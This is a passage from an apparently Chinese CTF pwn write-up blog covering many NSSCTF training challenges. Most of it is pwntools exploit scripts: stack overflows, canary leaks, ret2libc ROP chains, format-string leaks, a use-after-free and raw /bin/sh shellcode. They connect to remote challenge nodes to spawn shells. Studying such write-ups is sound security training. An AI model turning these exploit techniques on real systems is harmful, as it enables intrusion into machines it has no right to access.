class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#p = process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28316)</span><br><span class=\"line\">elf = ELF(&#x27;./littleof&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def debug():</span><br><span class=\"line\">    gdb.attach(p)</span><br><span class=\"line\">    pause()</span><br><span class=\"line\">def get_addr():</span><br><span class=\"line\">\treturn u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\"># leak canary</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x49</span><br><span class=\"line\">p.sendafter(b&#x27;overflow?&#x27;, payload)</span><br><span class=\"line\">p.recvuntil(payload)</span><br><span class=\"line\">canary = u64(p.recv(7).rjust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\">log.info(&#x27;canary addr is %x&#x27;%canary)</span><br><span class=\"line\"># leak libc_base</span><br><span class=\"line\">rdi = 0x400863</span><br><span class=\"line\">ret = 0x40059e</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x48 + p64(canary) + p64(0) + p64(rdi) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.sym[&#x27;puts&#x27;]) + p64(0x4006e2)</span><br><span class=\"line\">p.sendafter(b&#x27;harder!&#x27;, payload)</span><br><span class=\"line\">libc_base = get_addr() - 0x080aa0</span><br><span class=\"line\"></span><br><span class=\"line\"># leak canary</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x49</span><br><span class=\"line\">p.sendafter(b&#x27;overflow?&#x27;, payload)</span><br><span class=\"line\">p.recvuntil(b&#x27;a&#x27;*0x49)</span><br><span class=\"line\">canary = u64(p.recv(7).rjust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\">log.info(&#x27;canary addr is %x&#x27;%canary)</span><br><span class=\"line\"># get shell</span><br><span class=\"line\">system = libc_base + 0x04f550</span><br><span class=\"line\">binsh = libc_base + 0x1b3e1a</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x48 + p64(canary) + p64(0) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)</span><br><span class=\"line\">p.sendafter(b&#x27;harder!&#x27;, payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1easyoverflow\"><a class=\"anchor\" href=\"#hnctf-2022-week1easyoverflow\">#</a> [HNCTF 2022 Week1]easyoverflow</h5>\n<p>又是一个栈不稳定直接 cat flag 的题源代码是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;stdio.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    setbuf(stdin,0);</span><br><span class=\"line\">    setbuf(stdout,0);</span><br><span class=\"line\">    setbuf(stderr,0);</span><br><span class=\"line\">    puts(&quot;Input something&quot;);</span><br><span class=\"line\">    char name[30];</span><br><span class=\"line\">    int number=0;</span><br><span class=\"line\">    gets(name);</span><br><span class=\"line\">    if(number!=0)&#123;</span><br><span class=\"line\">        puts(&quot;You win.&quot;);</span><br><span class=\"line\">        system(&quot;cat flag&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>保护全关直接让 name 溢出后即可</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote(&#x27;1.1.1.1&#x27;,11)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*50</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nssctf-2022-spring-recruitr3m4ke\"><a class=\"anchor\" href=\"#nssctf-2022-spring-recruitr3m4ke\">#</a> [NSSCTF 2022 Spring Recruit]R3m4ke?</h5>\n<p>一个很简单达到 payload 的题</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28195)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x28+p64(0x40072C)</span><br><span class=\"line\">p.sendlineafter(&#x27;started&gt;&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1fmtstrre\"><a class=\"anchor\" href=\"#hnctf-2022-week1fmtstrre\">#</a> [HNCTF 2022 Week1]fmtstrre</h5>\n<p>字符串溢出直接查看 name 在 bss 里面的位置直接打就行注意栈平衡<br />\n %38$s 直接获得 flag</p>\n<h5 id=\"gdouctf-2023shellcode\"><a class=\"anchor\" href=\"#gdouctf-2023shellcode\">#</a> [GDOUCTF 2023]Shellcode</h5>\n<p>read 储存 name 在 bss 段上面，并且可以写入 25 的字节长度但是 shellcraft 默认生成的字节数是 44 位长度，那我们直接去网上找一个小于 25 字节的 shellcode</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28735)</span><br><span class=\"line\">shellcode=&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&#x27;</span><br><span class=\"line\">name=0x6010A0</span><br><span class=\"line\">p.sendlineafter(&#x27;lease.&#x27;,shellcode)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0xA+0x8)+p64(name)</span><br><span class=\"line\">p.sendlineafter(&#x27;start!&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>这个题应该还能够 ret2libc 但是我打出来有点问题</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28010)</span><br><span class=\"line\">rdi_pop=0x4007b3</span><br><span class=\"line\">ret=0x40028e</span><br><span class=\"line\">elf=ELF(&#x27;pw&#x27;)</span><br><span class=\"line\">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\">main=0x400687</span><br><span class=\"line\">p.sendlineafter(&#x27;lease.&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\">payload1=b&#x27;a&#x27;*(0xA+0x8)+p64(rdi_pop)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class=\"line\">p.sendlineafter(&#x27;start!&#x27;,payload1)</span><br><span class=\"line\">puts_ad=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">log.info(&#x27;puts_ad is %x&#x27;%puts_ad)</span><br><span class=\"line\">libc=LibcSearcher(&#x27;puts&#x27;,puts_ad)</span><br><span class=\"line\">libc_base=puts_ad-libc.dump(&#x27;puts&#x27;)</span><br><span class=\"line\">sys_addr=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\">str_bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class=\"line\">p.sendlineafter(&#x27;lease.&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\">log.info(sys_addr)</span><br><span class=\"line\">log.info(str_bin_sh)</span><br><span class=\"line\">payload2=b&#x27;a&#x27;+(0xA+0x8)+p64(ret)+p64(rdi_pop)+p64(str_bin_sh)+p64(sys_addr)+p64(main)</span><br><span class=\"line\">p.sendlineafter(&#x27;start!&#x27;,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1ezr0p32\"><a class=\"anchor\" href=\"#hnctf-2022-week1ezr0p32\">#</a> [HNCTF 2022 Week1]ezr0p32</h5>\n<p>把 /bin/sh 写在.bss 上然后直接打</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28655)</span><br><span class=\"line\">p.sendlineafter(&#x27;name&#x27;,&#x27;/bin/sh&#x27;)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x1c+0x4)+p32(0x080483d0)+p32(0)+p32(0x0804A080)</span><br><span class=\"line\">p.sendlineafter(&#x27;time~&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"深育杯-2021find_flag\"><a class=\"anchor\" href=\"#深育杯-2021find_flag\">#</a> [深育杯 2021] find_flag</h5>\n<p>这个题涉及的知识点有点多毕竟保护全开，打开 ida 查看到 sub 函数里面的有个字符串溢出可以得到 canary 和基地址，用 gdb 因为开启了 ple 不能在 main 函数上下断点就只有下在 printf 上了然后调试你可以用 stack 查看到 rbp 上面的地址是 ****00 可以猜到这个就是 canary 了因为 canary 一般情况下都是以 00 结尾的，canary 保护主要是通过在栈下设置一个地址，返回是也必须带上那个地址不然就会触发保护，然后 ple 保护的话主要是通过每次修改.text、.data 的地址。tips：使用 pwngdb 可以利用 fmtarg 来得到栈偏移量</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">import time</span><br><span class=\"line\">elf=ELF(&#x27;find_flag&#x27;)</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28437)</span><br><span class=\"line\">p.sendlineafter(&#x27;name?&#x27;,&#x27;%17$p---%19$p&#x27;)</span><br><span class=\"line\">p.recvuntil(&#x27;you, &#x27;)</span><br><span class=\"line\">a=p.recv(18)</span><br><span class=\"line\">p.recvuntil(&#x27;---&#x27;)</span><br><span class=\"line\">b=p.recv(14)</span><br><span class=\"line\">a=int(a,16)</span><br><span class=\"line\">b=int(b,16)</span><br><span class=\"line\">log.info(a)</span><br><span class=\"line\">log.info(b)</span><br><span class=\"line\">base=b-0x146F</span><br><span class=\"line\">system=base+elf.sym[&#x27;system&#x27;]</span><br><span class=\"line\">log.info(&#x27;system addr is %x&#x27;%system)</span><br><span class=\"line\">cat=base+0x2004</span><br><span class=\"line\">rdi=base+0x14E3</span><br><span class=\"line\">ret=base+0x101A</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x38+p64(a)+p64(0)+p64(ret)+p64(rdi)+p64(cat)+p64(system)</span><br><span class=\"line\">p.sendlineafter(&#x27;else? &#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hdctf-2023pwnner\"><a class=\"anchor\" href=\"#hdctf-2023pwnner\">#</a> [HDCTF 2023]pwnner</h5>\n<p>这个题又让我学到了伪随机数这个 srand (0x38) 控制着 rand 的随机大小只需要使用 python 库的 ctypes 只要有 srand 就能得到 rand 的大小</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">libc = ctypes.CDLL(&quot;libc.so.6&quot;)</span><br><span class=\"line\">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class=\"line\">libc.srand(0x39)</span><br><span class=\"line\">rand_result = libc.rand()</span><br></pre></td></tr></table></figure></p>\n<p>最后代码如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import ctypes</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">libc=ctypes.CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28917)</span><br><span class=\"line\">libc.srand.argtypes=[ctypes.c_uint]</span><br><span class=\"line\">libc.srand(0x39)</span><br><span class=\"line\">rand_result=libc.rand()</span><br><span class=\"line\">p.sendlineafter(&#x27;name:&#x27;,str(rand_result))</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x40+0x8)+p64(0x4008B2)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"litctf-2023口算题卡\"><a class=\"anchor\" href=\"#litctf-2023口算题卡\">#</a> [LitCTF 2023] 口算题卡</h5>\n<p>口算题要么口算要么写个脚本我这么懒肯定是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28904)</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">while 1:</span><br><span class=\"line\">    eval_1=0</span><br><span class=\"line\">    payload=0</span><br><span class=\"line\">    p.recvuntil(&#x27;What is &#x27;)</span><br><span class=\"line\">    eval_1=p.recvuntil(b&#x27;?&#x27;)[:-1]</span><br><span class=\"line\">    log.info(eval_1)</span><br><span class=\"line\">    payload=eval(eval_1)</span><br><span class=\"line\">    p.send(str(payload))</span><br><span class=\"line\">p.recvline()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2022-新生赛有手就行的栈溢出\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛有手就行的栈溢出\">#</a> [SWPUCTF 2022 新生赛] 有手就行的栈溢出</h5>\n<p>看到危险函数栈溢出后跳转到 execve 即可</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28296)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20+0x8)+p64(0x401257)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022ezheap\"><a class=\"anchor\" href=\"#nisactf-2022ezheap\">#</a> [NISACTF 2022]ezheap</h5>\n<p>这题还没来得及打开看就出了，直接运行发现输入很多下面的报错是 sh，并且提示哪里多了，那我们就直接卡溢出那里运行就好</p>\n<h5 id=\"wustctf-2020getshell2\"><a class=\"anchor\" href=\"#wustctf-2020getshell2\">#</a> [WUSTCTF 2020]getshell2</h5>\n<p>sh 相当于执行 /bin/sh</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28650)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x18+0x4)+p32(0x8048529)+p32(0x08048670)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022uaf\"><a class=\"anchor\" href=\"#nisactf-2022uaf\">#</a> [NISACTF 2022]UAF</h5>\n<p>新手的第一个 uaf 题目这个题目很友好让我不太难受，checksec 看一下就明白开启了 canary，但是没有泄露我在 stack 上准备泄露他但是不行，直接死循环，32 位拖进 ida 看 f5 了，发现 f5 里面的函数有很多，并且逻辑分明，那只有慢慢审计了，看 main 函数发现是一个菜单有 create、edit、del、show，并且里面还有一个 system，感觉像是看到了新大陆一样，根据题目来就是 uaf，百度搜索一下就能发现 free 的漏洞，使用了 malloc 分配了内存空间给一个数字但是 free 没有清空只是暂时释放了，只要下一个同样申请一样的内存的话内存地址就会一样，再看 edit 能发现这个 if 语句能够修改 0 并且在里面输入值，然后就是 del，使用 free 释放空间，在之后就是 show 来查看 edit 写入的值，那就可有来构造 uaf 漏洞了。<br />\n`` 如果说有要注意的，就是利用 show 功能 get_shell 的时候只能使用索引为 0 的堆块，而 edit 不能编辑索引为 0 的堆块，所以就要用到 UAF 了因为 if (v1 &lt;= 0 || v1&gt; i ) 其中 0 可以通过</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28338)</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">def create():</span><br><span class=\"line\">    p.sendlineafter(&#x27;:&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\">def edit(index,string):</span><br><span class=\"line\">    p.sendlineafter(&#x27;:&#x27;,&#x27;2&#x27;)</span><br><span class=\"line\">    p.sendlineafter(&#x27;page&#x27;,index)</span><br><span class=\"line\">    p.sendlineafter(&#x27;strings&#x27;,string)</span><br><span class=\"line\">def dela(index):</span><br><span class=\"line\">    p.sendlineafter(&#x27;:&#x27;,&#x27;3&#x27;)</span><br><span class=\"line\">    p.sendlineafter(&#x27;page&#x27;,index)</span><br><span class=\"line\">def show(index):</span><br><span class=\"line\">    p.sendlineafter(&#x27;:&#x27;,&#x27;4&#x27;)</span><br><span class=\"line\">    p.sendlineafter(&#x27;page&#x27;,index)</span><br><span class=\"line\">create()</span><br><span class=\"line\">dela(&#x27;0&#x27;)</span><br><span class=\"line\">create()</span><br><span class=\"line\">payload=b&#x27;sh;\\x00&#x27;+p32(0x8048642)</span><br><span class=\"line\">edit(&#x27;1&#x27;,payload)</span><br><span class=\"line\">show(&#x27;0&#x27;)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020babyrop\"><a class=\"anchor\" href=\"#bjdctf-2020babyrop\">#</a> [BJDCTF 2020]babyrop</h5>\n<p>本题使用的是 libc6_2.23-0ubuntu11_amd64</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\"></span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">a=0</span><br><span class=\"line\"></span><br><span class=\"line\">if a:</span><br><span class=\"line\"></span><br><span class=\"line\"> p=process(&#x27;./pw&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">else:</span><br><span class=\"line\"></span><br><span class=\"line\"> p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28892)</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./pw&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">rdi_pop=0x400733</span><br><span class=\"line\"></span><br><span class=\"line\">ret=0x4004c9</span><br><span class=\"line\"></span><br><span class=\"line\">main=elf.sym[&#x27;main&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20+0x8)+p64(rdi_pop)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;story!&#x27;,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">puts=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(puts)</span><br><span class=\"line\"></span><br><span class=\"line\">libc=LibcSearcher(&#x27;puts&#x27;,puts)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base=puts-libc.dump(&#x27;puts&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">system=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">str_bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2=b&#x27;a&#x27;*(0x20+0x8)+p64(ret)+p64(rdi_pop)+p64(str_bin_sh)+p64(system)+p64(main)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1safe_shellcode\"><a class=\"anchor\" href=\"#hnctf-2022-week1safe_shellcode\">#</a> [HNCTF 2022 Week1]safe_shellcode</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28251)</span><br><span class=\"line\">payload=&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00gao@fossa&quot;</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hgame-2022-week1test-your-gdb\"><a class=\"anchor\" 